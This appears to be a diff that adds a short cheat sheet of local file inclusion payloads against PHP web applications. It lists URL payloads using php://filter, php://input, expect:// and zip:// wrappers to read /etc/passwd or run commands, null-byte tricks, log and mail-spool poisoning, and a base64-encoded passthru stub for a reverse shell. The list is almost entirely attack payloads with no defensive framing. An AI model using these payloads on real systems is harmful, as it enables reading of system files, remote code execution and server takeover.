@@ -1,0 +1,38 @@
+1) PHP Wrapper
+.php?page=expect://ls (expect PHP module is not enabled by default)
+.php?page=php://input&cmd=ls
+.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
+.php?page=php://filter/resource=/etc/passwd
+
+
+2) ZIP Wrapper
+.php?page=zip://path/to/file.zip%23shell
+
+
+3) /proc/self/environ
+Introduce code via the User Agent header
+
+
+4)Null byte
+.php?page=/etc/passwd%00
+.php?page=/etc/passwd%2500
+
+
+5) LFI to log file
+Apache access.log
+SSH auth.log
+
+
+6) Email a Reverse Shell
+Email a www-data and LFI /var/spool/mail/www-data
+
+
+
+
+
+7) Read any original file from server like php file
+php://filter/read=convert.base64-encode/resource=<filename>
+8) Get reverse shell using netcat and metasploit
+<?php passthru(base64_decode('<payload_base64>')); ?>
+
